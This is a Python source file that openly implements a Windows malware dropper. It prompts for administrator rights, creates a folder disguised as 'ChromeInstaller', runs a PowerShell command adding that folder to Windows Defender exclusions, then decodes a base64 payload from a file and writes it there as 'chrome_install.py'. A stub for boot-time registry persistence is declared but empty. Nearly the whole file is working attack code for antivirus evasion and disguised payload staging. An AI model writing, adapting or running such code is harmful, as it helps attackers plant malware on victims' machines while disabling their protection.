import base64
import os
import sys
import ctypes
import subprocess

class Encode:

    def __init__(self):
        self.file = ""
        self.outputfile = "malicious_code.txt"
        self.encoded_code = ""

    def read_file(self):
        with open(self.file, 'r') as file:
            file.read()

    def write_file(self):
        with open(self.outputfile, 'w') as file:
            file.write(self.encoded_code)

    def encode(self, code):
        """
        a method to encode to base64
        """
        code_bytes = code.encode("ascii")
        base64_bytes = base64.b64encode(code_bytes)
        base64_string = base64_bytes.decode("ascii")
        print(f"Encoded string: {base64_string}")

        return base64_string

    def decode(self, encoded_code):
        """
        a method to decode base64
        """
        
        base64_bytes = encoded_code.encode("ascii")

        encoded_code_bytes = base64.b64decode(base64_bytes)
        sample_string = encoded_code_bytes.decode("ascii")

        return sample_string

class Dropper:

    def __init__(self):
        self.username = self.get_username()
        self.folder_path = ""
        self.decoded_payload = ""

    def get_username(self):
        username = os.getlogin()

        print(f"[LOG] user: {username}")
        return username
        
    def is_admin(self):
        """a function which checks if running on admin privelages"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def run_as_admin(self):
        """
        a function which requests for admin privelages
        """
        script = sys.argv[0]
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)

    def create_obfuscated_folder(self):
        """
        a method that creates a folder where real time protection antivirus doesnt exist
        """

        # Add-MpPreference -ExclusionProcess "malicious.exe" #exclude a process

        self.folder_path = f"C:\\Users\\{self.username}\\Documents\\ChromeInstaller" 
        os.mkdir(self.folder_path)

        command = f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{self.folder_path}\'"'

        try:
            subprocess.run(command, shell=True, check=True)
            print(f"Folder {self.folder_path} has been added to Windows Defender exclusions.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to add exclusion: {e}")

    def decode_payload(self):
        """
        a method that wil decoe the payload
        """
        #decode payload
        encodeclass = Encode()
        
        with open("encoded_code.txt", "r") as malicious_payload:
            encoded_payload = malicious_payload.read()
            self.decoded_payload = encodeclass.decode(encoded_payload) 

    def write_payload(self):
        """
        a method that will write the payload in the obfuscated folder
        """
        path = f"{self.folder_path}\\chrome_install.py"
        with open(path, "w") as text_file:
            text_file.write(self.decoded_payload)

    def execute_payload(self):
        """
        a function which will create presistance registry to execute the payload at boot
        """


if __name__ == "__main__":

    #initiate dropper class
    dropper = Dropper()

    if not dropper.is_admin():
        print("Dit script vereist administratorrechten.")
        dropper.run_as_admin()
        sys.exit(0)

    dropper.create_obfuscated_folder()
    dropper.decode_payload()
    dropper.write_payload()


    



    